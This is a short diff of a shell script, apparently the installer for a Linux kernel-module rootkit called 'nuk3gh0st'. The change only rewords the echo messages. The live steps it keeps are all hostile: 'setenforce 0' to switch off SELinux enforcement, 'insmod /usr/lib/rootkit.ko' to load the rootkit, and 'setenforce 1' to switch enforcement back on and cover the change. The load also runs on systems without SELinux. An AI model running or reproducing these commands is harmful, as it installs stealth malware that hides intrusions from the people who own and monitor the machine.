@@ -6,14 +6,18 @@ echo ""
 echo "Checking if SELINUX is enabled..."
 if [ -f /usr/sbin/setenforce ]; then
 	echo "SELINUX is enabled"
-	echo "setenforce 0"
+	echo "Disabling SELINUX temporarily"
+	echo "cmd: setenforce 0"
 	setenforce 0
-	echo "insmod /usr/lib/rootkit.ko"
+	echo "Loading nuk3gh0st LKM rootkit"
+	echo "cmd: insmod /usr/lib/rootkit.ko"
         insmod /usr/lib/rootkit.ko
-	echo "setenforce 1"
+	echo "Reenabling SELINUX"
+	echo "cmd: setenforce 1"
 	setenforce 1
 else
 	echo "SELINUX is disabled"
-	echo "insmod /usr/lib/rootkit.ko"
+	echo "Loading nuk3gh0st LKM rootkit"
+	echo "cmd: insmod /usr/lib/rootkit.ko"
         insmod /usr/lib/rootkit.ko
 fi
